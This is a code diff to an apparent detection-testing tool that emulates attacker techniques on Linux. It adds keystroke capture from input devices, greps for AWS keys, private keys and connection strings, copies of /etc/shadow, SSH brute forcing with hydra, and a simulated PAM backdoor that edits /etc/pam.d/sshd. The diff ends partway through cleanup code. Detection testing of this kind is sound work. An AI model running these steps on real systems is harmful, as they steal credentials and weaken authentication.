@@ -699,95 +699,164 @@ impl AttackTechnique for KeyloggerSimulation {
                     nonexistent_devices.len()
                 );
 
-                // Attempt to read from EACH accessible device
+                // Attempt to read from EACH accessible device. Each dd is
+                // launched as a daemonised orphan: the shell backgrounds it via
+                // `nohup ... &` and exits, leaving dd reparented to init/systemd
+                // (PPID=1). The detection signature behavioural rules key on is
+                // "orphaned process reading /dev/input/event*" with PPID=1, not
+                // a direct child of the spawning binary. All daemons run in
+                // parallel, then a single capture window elapses, then all are
+                // terminated together.
                 if !accessible_devices.is_empty() {
                     writeln!(
                         file,
-                        "### Attempting capture from {} accessible devices",
+                        "### Spawning daemonised capture for {} accessible devices",
                         accessible_devices.len()
                     )
                     .unwrap();
                     writeln!(file).unwrap();
 
+                    // (device_path, daemon_pid, capture_file_path)
+                    let mut daemons: Vec<(String, u32, String)> = Vec::new();
+
+                    for (idx, device_path) in accessible_devices.iter().enumerate() {
+                        let temp_capture_file =
+                            format!("/tmp/signalbench_keylog_event{idx}.raw");
+                        let count = capture_duration * 1000;
+                        let shell_cmd = format!(
+                            "nohup dd if={device_path} of={temp_capture_file} bs=1 count={count} iflag=nonblock < /dev/null > /dev/null 2>&1 & echo $!"
+                        );
+
+                        match Command::new("/bin/sh")
+                            .arg("-c")
+                            .arg(&shell_cmd)
+                            .output()
+                            .await
+                        {
+                            Ok(out) if out.status.success() => {
+                                let pid_str = String::from_utf8_lossy(&out.stdout)
+                                    .trim()
+                                    .to_string();
+                                match pid_str.parse::<u32>() {
+                                    Ok(pid) => {
+                                        writeln!(
+                                            file,
+                                            "  Daemonised dd PID {pid} on {device_path} -> {temp_capture_file}"
+                                        )
+                                        .unwrap();
+                                        info!(
+                                            "Spawned daemonised dd (PID {pid}) on {device_path}"
+                                        );
+                                        daemons.push((
+                                            device_path.clone(),
+                                            pid,
+                                            temp_capture_file.clone(),
+                                        ));
+                                        artifacts.push(temp_capture_file.clone());
+                                    }
+                                    Err(_) => warn!(
+                                        "Could not parse dd PID from shell stdout: '{pid_str}'"
+                                    ),
+                                }
+                            }
+                            Ok(out) => {
+                                let stderr = String::from_utf8_lossy(&out.stderr);
+                                writeln!(
+                                    file,
+                                    "  Daemon spawn failed for {device_path}: status {:?} stderr {stderr}",
+                                    out.status.code()
+                                )
+                                .unwrap();
+                            }
+                            Err(e) => {
+                                writeln!(
+                                    file,
+                                    "  Daemon spawn error for {device_path}: {e}"
+                                )
+                                .unwrap();
+                                warn!("Daemon spawn error for {device_path}: {e}");
+                            }
+                        }
+                    }
+
                     let mut total_bytes_captured = 0u64;
                     let mut successful_captures = 0;
 
-                    for (idx, device_path) in accessible_devices.iter().enumerate() {
-                        writeln!(
-                            file,
-                            "#### Device {}/{}: {}",
-                            idx + 1,
-                            accessible_devices.len(),
-                            device_path
-                        )
-                        .unwrap();
+                    if !daemons.is_empty() {
                         info!(
-                            "Attempting capture from device {}/{}: {}",
-                            idx + 1,
-                            accessible_devices.len(),
-                            device_path
+                            "Sleeping {capture_duration}s while {} daemonised dd processes read input devices",
+                            daemons.len()
                         );
+                        sleep(Duration::from_secs(capture_duration)).await;
 
-                        // Create unique temp file for this device
-                        let temp_capture_file = format!("/tmp/signalbench_keylog_event{idx}.raw");
+                        // Send SIGTERM to all, brief settle, then SIGKILL any
+                        // survivors. Killing by PID is safe because the dds are
+                        // orphaned under init - signalbench is not their parent
+                        // and waitpid() is not required.
+                        for (_, pid, _) in &daemons {
+                            let _ = Command::new("kill")
+                                .args(["-TERM", &pid.to_string()])
+                                .output()
+                                .await;
+                        }
+                        sleep(Duration::from_millis(200)).await;
+                        for (_, pid, _) in &daemons {
+                            let _ = Command::new("kill")
+                                .args(["-KILL", &pid.to_string()])
+                                .output()
+                                .await;
+                        }
 
-                        // Use dd to attempt raw device read (generates telemetry)
-                        let dd_result = Command::new("dd")
-                            .arg(format!("if={device_path}"))
-                            .arg(format!("of={temp_capture_file}"))
-                            .arg("bs=1")
-                            .arg(format!("count={}", capture_duration * 1000)) // Increased from 100 to 1000
-                            .arg("iflag=nonblock")
-                            .stderr(std::process::Stdio::null())
-                            .stdout(std::process::Stdio::null())
-                            .spawn();
-
-                        match dd_result {
-                            Ok(mut child) => {
-                                // Let it run for capture_duration
-                                sleep(Duration::from_secs(capture_duration)).await;
-
-                                // Kill the dd process
-                                let _ = child.kill().await;
-
-                                // Check if we captured anything
-                                if let Ok(metadata) = fs::metadata(&temp_capture_file) {
-                                    let bytes_captured = metadata.len();
-                                    if bytes_captured > 0 {
-                                        writeln!(file, "  Raw bytes captured: {bytes_captured}")
-                                            .unwrap();
-                                        info!("  Captured {bytes_captured} raw bytes from {device_path}");
-
-                                        total_bytes_captured += bytes_captured;
+                        for (device_path, _, capture_file) in &daemons {
+                            match fs::metadata(capture_file) {
+                                Ok(meta) => {
+                                    let bytes = meta.len();
+                                    if bytes > 0 {
+                                        writeln!(
+                                            file,
+                                            "  {device_path} -> {bytes} bytes captured"
+                                        )
+                                        .unwrap();
+                                        info!(
+                                            "Captured {bytes} raw bytes from {device_path}"
+                                        );
+                                        total_bytes_captured += bytes;
                                         successful_captures += 1;
-
-                                        artifacts.push(temp_capture_file.clone());
                                     } else {
-                                        writeln!(file, "  No data captured (no keyboard events during capture window)").unwrap();
-                                        let _ = fs::remove_file(&temp_capture_file);
+                                        writeln!(
+                                            file,
+                                            "  {device_path} -> no data captured during window"
+                                        )
+                                        .unwrap();
+                                        let _ = fs::remove_file(capture_file);
                                     }
-                                } else {
-                                    writeln!(file, "  Failed to capture data").unwrap();
                                 }
-                            }
-                            Err(e) => {
-                                writeln!(file, "  Failed to start device capture: {e}").unwrap();
-                                warn!("  Failed to start dd for {device_path}: {e}");
+                                Err(_) => writeln!(
+                                    file,
+                                    "  {device_path} -> capture file missing"
+                                )
+                                .unwrap(),
                             }
                         }
-                        writeln!(file).unwrap();
+                    } else {
+                        writeln!(
+                            file,
+                            "All daemon spawns failed - no capture data available"
+                        )
+                        .unwrap();
                     }
 
                     events_captured = total_bytes_captured as usize;
                     if successful_captures > 0 {
                         capture_method = format!(
-                            "Device capture from {} devices ({} successful)",
+                            "Daemonised device capture from {} devices ({} successful, total {total_bytes_captured} bytes)",
                             accessible_devices.len(),
                             successful_captures
                         );
 
                         writeln!(file, "REAL device capture summary:").unwrap();
-                        writeln!(file, "  - Total bytes captured: {total_bytes_captured}").unwrap();
+                        writeln!(file, "  - Total bytes captured: {total_bytes_captured}")
+                            .unwrap();
                         writeln!(
                             file,
                             "  - Successful captures: {successful_captures}/{}",
@@ -796,7 +865,7 @@ impl AttackTechnique for KeyloggerSimulation {
                         .unwrap();
                         writeln!(
                             file,
-                            "Note: Raw evdev data captured (not decoded for simulation purposes)"
+                            "Note: dd processes ran daemonised (PPID=1) so the read pattern matches real keylogger behaviour"
                         )
                         .unwrap();
                         writeln!(file).unwrap();
@@ -2670,22 +2739,98 @@ impl AttackTechnique for CredentialsInFiles {
             )
             .unwrap();
 
+            // Shell-driven DLP grep phase. The Rust-side regex sweep above
+            // produces no exec events; DLP and credential-discovery analytics
+            // key on a process running grep against /etc, /home, or /root with
+            // distinctive patterns. Run three separate greps so XDR sees three
+            // child processes with the high-value regex in argv. Each grep is
+            // bounded with timeout to keep runtime contained on large trees.
+            let dlp_session: String = Uuid::new_v4()
+                .to_string()
+                .split('-')
+                .next()
+                .unwrap_or("dlp")
+                .to_string();
+            let aws_stage =
+                format!("/tmp/signalbench_dlp_aws_{dlp_session}.txt");
+            let key_stage =
+                format!("/tmp/signalbench_dlp_privatekey_{dlp_session}.txt");
+            let conn_stage =
+                format!("/tmp/signalbench_dlp_connstr_{dlp_session}.txt");
+            let mut dlp_artifacts: Vec<String> = Vec::new();
+
+            // Source paths: /etc is always safe to grep, /home and /root are
+            // included with permission errors silenced.
+            let grep_paths = if is_root {
+                "/etc /home /root"
+            } else {
+                "/etc /home"
+            };
+
+            // AWS access keys - AKIA prefix + 16 [A-Z0-9] - fires AWS DLP rules.
+            let aws_cmd = format!(
+                "timeout 30 grep -rIE 'AKIA[0-9A-Z]{{16}}|aws_secret_access_key' {grep_paths} > {aws_stage} 2>/dev/null || true"
+            );
+            let _ = Command::new("/bin/sh")
+                .arg("-c")
+                .arg(&aws_cmd)
+                .output()
+                .await;
+            if Path::new(&aws_stage).exists() {
+                info!("[T1552.001] DLP AWS grep staged at {aws_stage}");
+                dlp_artifacts.push(aws_stage.clone());
+            }
+
+            // Private key headers - PEM and OpenSSH formats. Listing files
+            // (-l) keeps the stage file small while still firing the rule.
+            let key_cmd = format!(
+                "timeout 30 grep -lrE -- '-----BEGIN (RSA |EC |OPENSSH |DSA |ENCRYPTED |)?PRIVATE KEY-----' {grep_paths} > {key_stage} 2>/dev/null || true"
+            );
+            let _ = Command::new("/bin/sh")
+                .arg("-c")
+                .arg(&key_cmd)
+                .output()
+                .await;
+            if Path::new(&key_stage).exists() {
+                info!("[T1552.001] DLP private-key grep staged at {key_stage}");
+                dlp_artifacts.push(key_stage.clone());
+            }
+
+            // Connection strings - jdbc:, mongodb://, postgres://, mysql://.
+            let conn_cmd = format!(
+                "timeout 30 grep -rIE 'jdbc:|mongodb(\\+srv)?://|postgres(ql)?://|mysql://' {grep_paths} > {conn_stage} 2>/dev/null || true"
+            );
+            let _ = Command::new("/bin/sh")
+                .arg("-c")
+                .arg(&conn_cmd)
+                .output()
+                .await;
+            if Path::new(&conn_stage).exists() {
+                info!("[T1552.001] DLP connection-string grep staged at {conn_stage}");
+                dlp_artifacts.push(conn_stage.clone());
+            }
+
             // Log summary to console
             info!("REAL credential harvesting complete:");
             info!("  - Files searched: {files_searched}");
             info!("  - Credential files found: {credential_files_found}");
             info!("  - Credential patterns discovered: {total_patterns_found}");
+            info!("  - DLP grep stages: {}", dlp_artifacts.len());
             info!("  - Log saved to: {output_file}");
 
             let success_message = format!(
-                "REAL credential harvesting complete - Searched {files_searched} files, found {credential_files_found} credential files with {total_patterns_found} total patterns"
+                "REAL credential harvesting complete - Searched {files_searched} files, found {credential_files_found} credential files with {total_patterns_found} total patterns; {} DLP grep stages produced",
+                dlp_artifacts.len()
             );
+
+            let mut all_artifacts = vec![output_file];
+            all_artifacts.extend(dlp_artifacts);
 
             Ok(SimulationResult {
                 technique_id: self.info().id,
                 success: true,
                 message: success_message,
-                artifacts: vec![output_file],
+                artifacts: all_artifacts,
                 cleanup_required: true,
             })
         })
@@ -3480,13 +3625,36 @@ impl AttackTechnique for SSHBruteForce {
                 "qwerty123",
             ];
 
+            // Realistic username rotation. Real Hydra/Medusa runs cycle through
+            // common service accounts; sticking to a single username collapses
+            // the detection surface to one auth-log line. Include the locally
+            // created test user as the first entry so the user-exists baseline
+            // is still exercised, then rotate through accounts that may or may
+            // not exist on the target.
+            let mut username_rotation: Vec<String> = vec![test_username.clone()];
+            for u in [
+                "root", "admin", "postgres", "oracle", "git", "deploy", "ubuntu", "test",
+            ] {
+                if u != test_username {
+                    username_rotation.push(u.to_string());
+                }
+            }
+
             // Perform REAL SSH brute force attempts
             writeln!(log, "## Performing REAL SSH Brute Force Attempts").unwrap();
-            writeln!(log, "Target User: {test_username}").unwrap();
+            writeln!(
+                log,
+                "Username rotation: {}",
+                username_rotation.join(", ")
+            )
+            .unwrap();
             writeln!(log, "Target Host: {target_host}:{target_port}").unwrap();
             writeln!(log).unwrap();
 
-            info!("Starting REAL SSH brute force attempts against {target_host}:{target_port}");
+            info!(
+                "Starting REAL SSH brute force attempts against {target_host}:{target_port} across {} usernames",
+                username_rotation.len()
+            );
 
             let mut successful_attempts = 0;
             let mut failed_attempts = 0;
@@ -3495,13 +3663,14 @@ impl AttackTechnique for SSHBruteForce {
             for (idx, password) in password_attempts.iter().take(attempt_count).enumerate() {
                 let attempt_num = idx + 1;
                 let start_time = std::time::Instant::now();
+                let attempt_user = &username_rotation[idx % username_rotation.len()];
 
                 info!(
-                    "Attempt {attempt_num}/{attempt_count}: Testing password pattern: {password}"
+                    "Attempt {attempt_num}/{attempt_count}: {attempt_user}@{target_host} pattern: {password}"
                 );
                 writeln!(
                     log,
-                    "Attempt {attempt_num}/{attempt_count}: Testing password: '{password}'"
+                    "Attempt {attempt_num}/{attempt_count}: user '{attempt_user}' password '{password}'"
                 )
                 .unwrap();
 
@@ -3522,7 +3691,7 @@ impl AttackTechnique for SSHBruteForce {
                         "NumberOfPasswordPrompts=1",
                         "-p",
                         &target_port,
-                        &format!("{test_username}@{target_host}"),
+                        &format!("{attempt_user}@{target_host}"),
                         "echo",
                         "test",
                     ])
@@ -3572,7 +3741,7 @@ impl AttackTechnique for SSHBruteForce {
                                 "PasswordAuthentication=no",
                                 "-p",
                                 &target_port,
-                                &format!("{test_username}@{target_host}"),
+                                &format!("{attempt_user}@{target_host}"),
                                 "echo",
                                 "test",
                             ])
@@ -3601,8 +3770,68 @@ impl AttackTechnique for SSHBruteForce {
 
                 writeln!(log).unwrap();
 
-                // Small delay between attempts to simulate realistic brute force
-                sleep(Duration::from_millis(500)).await;
+                // Pace attempts at roughly 10/s to match the burst rate
+                // Cortex/Snort SSH brute-force signatures look for.
+                sleep(Duration::from_millis(100)).await;
+            }
+
+            // Invoke hydra directly when available so the brute-force tool name
+            // appears in the process tree and argv. The actual attempt list is
+            // intentionally tiny; the goal is the binary fingerprint, not extra
+            // auth-log volume on top of the sshpass loop above.
+            let hydra_check = Command::new("which").arg("hydra").output().await;
+            if let Ok(out) = hydra_check {
+                if out.status.success() {
+                    let user_list = username_rotation.join("\n");
+                    let pass_list = password_attempts.join("\n");
+                    let user_list_path = format!("/tmp/signalbench_users_{session_id}");
+                    let pass_list_path = format!("/tmp/signalbench_passwords_{session_id}");
+
+                    if let Err(e) = tokio::fs::write(&user_list_path, &user_list).await {
+                        warn!("Could not stage hydra user list: {e}");
+                    } else if let Err(e) = tokio::fs::write(&pass_list_path, &pass_list).await {
+                        warn!("Could not stage hydra password list: {e}");
+                    } else {
+                        info!("Invoking hydra against {target_host}:{target_port}");
+                        let hydra_result = Command::new("hydra")
+                            .args([
+                                "-L",
+                                &user_list_path,
+                                "-P",
+                                &pass_list_path,
+                                "-t",
+                                "4",
+                                "-f",
+                                "-o",
+                                &format!("/tmp/signalbench_hydra_{session_id}.out"),
+                                "-s",
+                                &target_port,
+                                &target_host,
+                                "ssh",
+                            ])
+                            .output()
+                            .await;
+                        match hydra_result {
+                            Ok(h) => writeln!(
+                                log,
+                                "hydra exit={} stderr={}",
+                                h.status.code().unwrap_or(-1),
+                                String::from_utf8_lossy(&h.stderr)
+                                    .lines()
+                                    .next()
+                                    .unwrap_or("")
+                            )
+                            .unwrap(),
+                            Err(e) => writeln!(log, "hydra invocation failed: {e}").unwrap(),
+                        }
+                        let _ = tokio::fs::remove_file(&user_list_path).await;
+                        let _ = tokio::fs::remove_file(&pass_list_path).await;
+                        let _ = tokio::fs::remove_file(format!(
+                            "/tmp/signalbench_hydra_{session_id}.out"
+                        ))
+                        .await;
+                    }
+                }
             }
 
             // Write timing analysis
@@ -4111,6 +4340,82 @@ impl AttackTechnique for EtcPasswdShadow {
                 }
             }
 
+            // Phase 2b: Stage copies of /etc/passwd and /etc/shadow via a shell
+            // so the cat -> redirect exec sequence is visible to XDR. Reading
+            // these files via Rust fs::read above produces no exec event; the
+            // high-severity detection keys on a shell child running cat on
+            // /etc/shadow with stdout redirected to a staging path. Naming
+            // preserves the existing /tmp/signalbench_* artefact prefix so the
+            // cleanup path picks them up uniformly.
+            let passwd_stage =
+                format!("/tmp/signalbench_passwd_stage_{session_id}.txt");
+            let shadow_stage =
+                format!("/tmp/signalbench_shadow_stage_{session_id}.txt");
+            let priv_stage =
+                format!("/tmp/signalbench_passwd_shadow_priv_{session_id}.txt");
+            let mut stage_artifacts: Vec<String> = Vec::new();
+
+            let passwd_cmd = format!("cat /etc/passwd > {passwd_stage}");
+            match Command::new("/bin/sh")
+                .arg("-c")
+                .arg(&passwd_cmd)
+                .output()
+                .await
+            {
+                Ok(out) if out.status.success() => {
+                    info!("Phase 2b: Staged /etc/passwd to {passwd_stage}");
+                    stage_artifacts.push(passwd_stage.clone());
+                }
+                Ok(out) => warn!(
+                    "Phase 2b: passwd stage exited {:?}",
+                    out.status.code()
+                ),
+                Err(e) => warn!("Phase 2b: passwd stage spawn failed: {e}"),
+            }
+
+            if is_root {
+                let shadow_cmd = format!("cat /etc/shadow > {shadow_stage}");
+                match Command::new("/bin/sh")
+                    .arg("-c")
+                    .arg(&shadow_cmd)
+                    .output()
+                    .await
+                {
+                    Ok(out) if out.status.success() => {
+                        info!("Phase 2b: Staged /etc/shadow to {shadow_stage}");
+                        stage_artifacts.push(shadow_stage.clone());
+                    }
+                    Ok(out) => warn!(
+                        "Phase 2b: shadow stage exited {:?}",
+                        out.status.code()
+                    ),
+                    Err(e) => warn!("Phase 2b: shadow stage spawn failed: {e}"),
+                }
+
+                // grep root/admin out of shadow into a separate staging file -
+                // chains grep with the shadow read and produces a focused
+                // privileged-account artefact the way a real attacker would.
+                let priv_cmd = format!(
+                    "grep -E '^(root|admin|sudo):' /etc/shadow > {priv_stage} 2>/dev/null || true"
+                );
+                match Command::new("/bin/sh")
+                    .arg("-c")
+                    .arg(&priv_cmd)
+                    .output()
+                    .await
+                {
+                    Ok(_) => {
+                        if Path::new(&priv_stage).exists() {
+                            info!(
+                                "Phase 2b: Staged privileged shadow entries to {priv_stage}"
+                            );
+                            stage_artifacts.push(priv_stage.clone());
+                        }
+                    }
+                    Err(e) => warn!("Phase 2b: priv stage spawn failed: {e}"),
+                }
+            }
+
             // Phase 3: Generate comprehensive report
             info!("Phase 3: Generating user enumeration report...");
 
@@ -4135,6 +4440,9 @@ impl AttackTechnique for EtcPasswdShadow {
 
             info!("User enumeration report saved to: {output_file}");
 
+            let mut all_artifacts = vec![output_file];
+            all_artifacts.extend(stage_artifacts);
+
             Ok(SimulationResult {
                 technique_id: self.info().id,
                 success: true,
@@ -4146,7 +4454,7 @@ impl AttackTechnique for EtcPasswdShadow {
                     service_accounts.len(),
                     human_users.len()
                 ),
-                artifacts: vec![output_file],
+                artifacts: all_artifacts,
                 cleanup_required: true,
             })
         })
@@ -4166,6 +4474,381 @@ impl AttackTechnique for EtcPasswdShadow {
             }
 
             info!("/etc/passwd and /etc/shadow enumeration cleanup complete");
+            Ok(())
+        })
+    }
+}
+
+// ---------------------------------------------------------------------------
+// T1556.003 -- Modify Authentication Process: Pluggable Authentication Modules
+// ---------------------------------------------------------------------------
+//
+// Post-XZ Utils (CVE-2024-3094) PAM backdoor TTP.  Real attackers drop a
+// malicious replacement for /lib/security/pam_unix.so (or inject a new PAM
+// module) that hooks pam_sm_authenticate / pam_get_authtok to log
+// credentials in cleartext, then add an "auth sufficient <module.so>" line
+// to /etc/pam.d/sshd so the backdoor module is consulted before the real
+// pam_unix.  This technique reproduces that exact sequence of writes,
+// copies, and ldconfig invocations -- the syscall trace itself is the EDR
+// detection signal regardless of whether the operations succeed.
+//
+// Detection signals exercised by this technique:
+//   - Creation of an ELF .so file under /tmp by an unprivileged process
+//   - cp / open() write attempts targeting /lib/security/, /lib/x86_64-
+//     linux-gnu/security/, /lib64/security/, /usr/lib/security/
+//   - Read / write of /etc/pam.d/sshd (and /etc/pam.d/common-auth on some
+//     distros)
+//   - ldconfig invocation following the above writes
+//   - New "auth ... <path>.so" line in a PAM configuration file
+//
+pub struct PamBackdoor {}
+
+#[async_trait]
+impl AttackTechnique for PamBackdoor {
+    fn info(&self) -> Technique {
+        Technique {
+            id: "T1556.003".to_string(),
+            name: "PAM Backdoor".to_string(),
+            description: "Simulates the post-XZ Utils (CVE-2024-3094) PAM backdoor \
+                          TTP: writes a fake pam_unix.so-shaped ELF file to /tmp, \
+                          attempts to copy it into every standard PAM module \
+                          directory (/lib/security/, /lib/x86_64-linux-gnu/security/, \
+                          /lib64/security/, /usr/lib/security/), and (when running \
+                          as root) backs up /etc/pam.d/sshd before appending an \
+                          \"auth sufficient <fake.so>\" backdoor line.  Finally \
+                          invokes ldconfig to flush the dynamic linker cache.  All \
+                          modifications are reversible: PAM config restored from \
+                          backup, fake .so removed from /tmp and any system \
+                          directory where the copy succeeded.  Without root the \
+                          copy attempts fail by design -- the syscall trace is the \
+                          detection signal.".to_string(),
+            category: "credential_access".to_string(),
+            parameters: vec![
+                TechniqueParameter {
+                    name: "pam_file".to_string(),
+                    description: "PAM configuration file to back up and modify \
+                                  (default /etc/pam.d/sshd)".to_string(),
+                    required: false,
+                    default: Some("/etc/pam.d/sshd".to_string()),
+                },
+                TechniqueParameter {
+                    name: "module_name".to_string(),
+                    description: "Filename for the fake PAM module (default \
+                                  pam_unix.so to mimic the real glibc-bundled \
+                                  module)".to_string(),
+                    required: false,
+                    default: Some("pam_unix.so".to_string()),
+                },
+            ],
+            detection: "Monitor write syscalls to /etc/pam.d/* and to any directory \
+                        under /lib/security/, /lib/x86_64-linux-gnu/security/, or \
+                        /lib64/security/.  Watch for new pam_*.so files appearing \
+                        in those paths and for ldconfig invocations from non-package- \
+                        manager processes.  Look for new \"auth\" lines in PAM \
+                        configurations that reference module paths outside \
+                        /lib*/security/.  These signals were heavily exercised by \
+                        EDR vendors in 2024-2025 following the XZ Utils backdoor \
+                        disclosure.".to_string(),
+            cleanup_support: true,
+            platforms: vec!["Linux".to_string()],
+            permissions: vec![],
+            voltron_only: false,
+        }
+    }
+
+    fn execute<'a>(&'a self, config: &'a TechniqueConfig, dry_run: bool) -> ExecuteFuture<'a> {
+        Box::pin(async move {
+            let session_id = Uuid::new_v4().to_string().replace('-', "");
+            let pam_file = config
+                .parameters
+                .get("pam_file")
+                .cloned()
+                .unwrap_or_else(|| "/etc/pam.d/sshd".to_string());
+            let module_name = config
+                .parameters
+                .get("module_name")
+                .cloned()
+                .unwrap_or_else(|| "pam_unix.so".to_string());
+
+            let fake_so = format!("/tmp/signalbench_pam_{session_id}.so");
+            let backup_file = format!("/tmp/signalbench_pam_backup_{session_id}.bak");
+            let artifacts_file = format!("/tmp/signalbench_pam_backdoor_{session_id}.json");
+            let is_root = unsafe { libc::geteuid() } == 0;
+
+            let mut artifacts: Vec<String> = vec![artifacts_file.clone()];
+
+            if dry_run {
+                info!("[DRY RUN] Would deploy PAM backdoor:");
+                info!("[DRY RUN]   Fake module:       {fake_so}");
+                info!("[DRY RUN]   Module filename:   {module_name}");
+                info!("[DRY RUN]   Target PAM config: {pam_file}");
+                info!("[DRY RUN]   Backup path:       {backup_file}");
+                info!("[DRY RUN]   Running as root:   {is_root}");
+                return Ok(SimulationResult {
+                    technique_id: self.info().id,
+                    success: true,
+                    message: "DRY RUN: Would write fake PAM module to /tmp, attempt copy to system \
+                              PAM directories, modify /etc/pam.d/sshd with backup, invoke ldconfig"
+                        .to_string(),
+                    artifacts: vec![],
+                    cleanup_required: false,
+                });
+            }
+
+            info!("Starting PAM backdoor simulation (Session: {session_id})...");
+            info!("Target PAM config: {pam_file}");
+            info!("Fake module:       {fake_so}");
+            info!("Running as root:   {is_root}");
+
+            // -- Phase 1: write a minimal ELF-shaped file to /tmp -------------
+            // A real PAM backdoor module exports pam_sm_authenticate and
+            // pam_get_authtok; we embed the strings so file(1) / strings
+            // analysis classifies the artefact realistically without us
+            // shipping a working .so.
+            info!("Phase 1: Writing fake PAM module ({fake_so})");
+            let mut blob: Vec<u8> = vec![
+                // ELF64 header magic + class (64-bit) + endian (LE) + version (1)
+                0x7F, 0x45, 0x4C, 0x46, 0x02, 0x01, 0x01, 0x00,
+                // padding (e_ident[EI_OSABI] .. e_ident[EI_PAD])
+                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+                // e_type = ET_DYN (3, shared object)
+                0x03, 0x00,
+                // e_machine = EM_X86_64 (0x3E)
+                0x3E, 0x00,
+                // e_version
+                0x01, 0x00, 0x00, 0x00,
+            ];
+            blob.extend_from_slice(
+                b"\x00SIGNALBENCH_FAKE_PAM_MODULE_",
+            );
+            blob.extend_from_slice(session_id.as_bytes());
+            blob.extend_from_slice(b"\x00pam_sm_authenticate\x00pam_sm_setcred\x00");
+            blob.extend_from_slice(b"pam_get_authtok\x00pam_get_user\x00");
+            blob.extend_from_slice(b"libc.so.6\x00libpam.so.0\x00");
+
+            match fs::write(&fake_so, &blob) {
+                Ok(_) => {
+                    info!("[OK] Fake PAM module written ({} bytes)", blob.len());
+                    artifacts.push(fake_so.clone());
+                }
+                Err(e) => {
+                    return Err(format!("Failed to write fake .so to /tmp: {e}"));
+                }
+            }
+
+            // -- Phase 2: attempt copies into PAM module directories ----------
+            // Without root every cp call will fail with EACCES -- the failed
+            // openat() / write() syscalls in those directories are the EDR
+            // signal regardless.
+            info!("Phase 2: Attempting copy into system PAM module directories");
+            let pam_target_dirs = [
+                "/lib/security/",
+                "/lib/x86_64-linux-gnu/security/",
+                "/lib64/security/",
+                "/usr/lib/security/",
+            ];
+            let mut copy_attempts: Vec<(String, bool)> = Vec::new();
+            for dir in pam_target_dirs {
+                let dest = format!("{dir}{module_name}");
+                info!("  Attempting cp {fake_so} -> {dest}");
+                let output = Command::new("cp").args([&fake_so, &dest]).output().await;
+                match output {
+                    Ok(o) if o.status.success() => {
+                        warn!("[!] cp SUCCEEDED to {dest} -- copy will be cleaned up");
+                        artifacts.push(dest.clone());
+                        copy_attempts.push((dest, true));
+                    }
+                    Ok(o) => {
+                        let stderr = String::from_utf8_lossy(&o.stderr);
+                        info!(
+                            "  [INFO] cp to {dest} failed as expected: {}",
+                            stderr.trim()
+                        );
+                        copy_attempts.push((dest, false));
+                    }
+                    Err(e) => {
+                        warn!("  cp invocation error for {dest}: {e}");
+                        copy_attempts.push((dest, false));
+                    }
+                }
+            }
+
+            // -- Phase 3: backup + modify /etc/pam.d/sshd (root only) ---------
+            // Even without root, attempt to READ the file so the open()
+            // syscall is captured -- a probe is still telemetry.
+            let pam_modified = if is_root && Path::new(&pam_file).exists() {
+                info!("Phase 3: Backing up and modifying {pam_file}");
+                match fs::copy(&pam_file, &backup_file) {
+                    Ok(_) => {
+                        info!("[OK] Backup created: {backup_file}");
+                        artifacts.push(backup_file.clone());
+                        let mut content =
+                            fs::read_to_string(&pam_file).unwrap_or_default();
+                        let backdoor_line = format!(
+                            "\n# SIGNALBENCH-PAM-BACKDOOR-{session_id}\n\
+                             auth sufficient {fake_so}\n"
+                        );
+                        content.push_str(&backdoor_line);
+                        match fs::write(&pam_file, content) {
+                            Ok(_) => {
+                                info!("[OK] Appended backdoor line to {pam_file}");
+                                true
+                            }
+                            Err(e) => {
+                                warn!("Failed to modify {pam_file}: {e}");
+                                false
+                            }
+                        }
+                    }
+                    Err(e) => {
+                        warn!("Failed to backup {pam_file}: {e}");
+                        false
+                    }
+                }
+            } else {
+                if !is_root {
+                    info!("Phase 3: Not root -- read-only probe of {pam_file}");
+                } else {
+                    info!("Phase 3: {pam_file} missing -- read-only probe");
+                }
+                // A failed open() of /etc/pam.d/sshd is still a detection signal.
+                let _ = fs::read_to_string(&pam_file);
+                false
+            };
+
+            // -- Phase 4: ldconfig invocation ---------------------------------
+            // Real attackers run ldconfig after dropping a new .so so the
+            // dynamic linker cache picks it up.  Even when our cp calls
+            // failed, ldconfig is the canonical follow-on signal.
+            info!("Phase 4: Invoking ldconfig");
+            let ldconfig_result = Command::new("ldconfig").output().await;
+            match ldconfig_result {
+                Ok(o) if o.status.success() => {
+                    info!("[OK] ldconfig executed");
+                }
+                Ok(o) => {
+                    info!(
+                        "[INFO] ldconfig returned non-zero ({}): {}",
+                        o.status,
+                        String::from_utf8_lossy(&o.stderr).trim()
+                    );
+                }
+                Err(e) => {
+                    info!("[INFO] ldconfig invocation failed: {e}");
+                }
+            }
+
+            // -- Persist artifact metadata for cleanup -----------------------
+            let copy_meta: Vec<serde_json::Value> = copy_attempts
+                .iter()
+                .map(|(dest, ok)| serde_json::json!({"dest": dest, "success": ok}))
+                .collect();
+            let metadata = serde_json::json!({
+                "session_id":     session_id,
+                "fake_so":        fake_so,
+                "pam_file":       pam_file,
+                "module_name":    module_name,
+                "pam_modified":   pam_modified,
+                "backup_file":    if pam_modified { Some(backup_file.clone()) } else { None },
+                "copy_attempts":  copy_meta,
+                "is_root":        is_root,
+                "timestamp":      chrono::Local::now().to_rfc3339(),
+            });
+            if let Err(e) = fs::write(&artifacts_file, metadata.to_string()) {
+                warn!("Failed to write artifact metadata {artifacts_file}: {e}");
+            }
+
+            let successful_copies =
+                copy_attempts.iter().filter(|(_, ok)| *ok).count();
+            Ok(SimulationResult {
+                technique_id: self.info().id,
+                success: true,
+                message: format!(
+                    "PAM backdoor simulated: fake module at {fake_so}, {} cp attempts \
+                     ({} succeeded), {} {} (ldconfig invoked).",
+                    copy_attempts.len(),
+                    successful_copies,
+                    pam_file,
+                    if pam_modified {
+                        "modified with backup"
+                    } else {
+                        "read-only probed (no root or file missing)"
+                    },
+                ),
+                artifacts,
+                cleanup_required: true,
+            })
+        })
+    }
+
+    fn cleanup<'a>(&'a self, artifacts: &'a [String]) -> CleanupFuture<'a> {
+        Box::pin(async move {
+            info!("Cleaning up PAM backdoor artifacts...");
+
+            // Read metadata file to discover backup path and successful copies.
+            let meta_file = artifacts
+                .iter()
+                .find(|a| a.contains("_pam_backdoor_") && a.ends_with(".json"));
+            if let Some(meta_path) = meta_file {
+                if let Ok(content) = fs::read_to_string(meta_path) {
+                    if let Ok(json) =
+                        serde_json::from_str::<serde_json::Value>(&content)
+                    {
+                        // Restore PAM config from backup if it was modified.
+                        if json["pam_modified"].as_bool().unwrap_or(false) {
+                            let backup = json["backup_file"].as_str().unwrap_or("");
+                            let pam_file = json["pam_file"].as_str().unwrap_or("");
+                            if !backup.is_empty()
+                                && !pam_file.is_empty()
+                                && Path::new(backup).exists()
+                            {
